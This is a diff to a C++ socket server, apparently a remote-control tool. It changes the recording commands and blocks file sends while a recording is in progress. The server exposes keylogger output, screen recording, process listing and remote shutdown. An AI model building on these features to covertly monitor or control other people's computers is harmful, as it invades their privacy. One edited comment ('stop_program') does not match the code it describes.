@@ -11,13 +11,13 @@ std::map<std::string, std::string> fileCommands = {
     {"list_program", saveDir + "running_programs.txt"},
     {"list_process", saveDir + "processes_with_pid.txt"},
     {"list_installed", saveDir + "installed_programs.txt"},
-    {"get_recording", saveDir + "recording.avi"},
+    {"start_recording", saveDir + "recording.avi"},
     {"keylogger", saveDir + "keylog.txt"}  // Thêm keylogger vào fileCommands
 };
 
 // Các command không cần tạo file nhưng cần confirmation
 std::set<std::string> simpleCommands = {"shutdown", "restart",
-                                        "cancel_shutdown"};
+                                        "cancel_shutdown", "stop_recording"};
 
 bool is_start_program_command(const std::string& command) {
   return command.find("start_program") == 0;
@@ -110,7 +110,13 @@ void handle_client(SOCKET clientSocket) {
     // Xử lý các command khác tạo file
     else if (fileCommands.count(command)) {
       std::string outputFile = fileCommands[command];
-
+      if (recording_in_progress.load()) {
+        std::cout << "[Server] Recording in progress, refusing to send file yet." << std::endl;
+        size_t zero = 0;
+        send(clientSocket, reinterpret_cast<const char*>(&zero), sizeof(zero), 0);
+        closesocket(clientSocket);
+        return;
+      }
       std::filesystem::create_directories(
           std::filesystem::path(outputFile).parent_path());
 
@@ -128,7 +134,7 @@ void handle_client(SOCKET clientSocket) {
              sizeof(fileSize), 0);
       }
     }
-    // Xử lý các command đơn giản (shutdown, restart, start_program)
+    // Xử lý các command đơn giản (shutdown, restart, stop_program)
     else if (simpleCommands.count(command) ||
              is_start_program_command(command)) {
       execute_command(command);
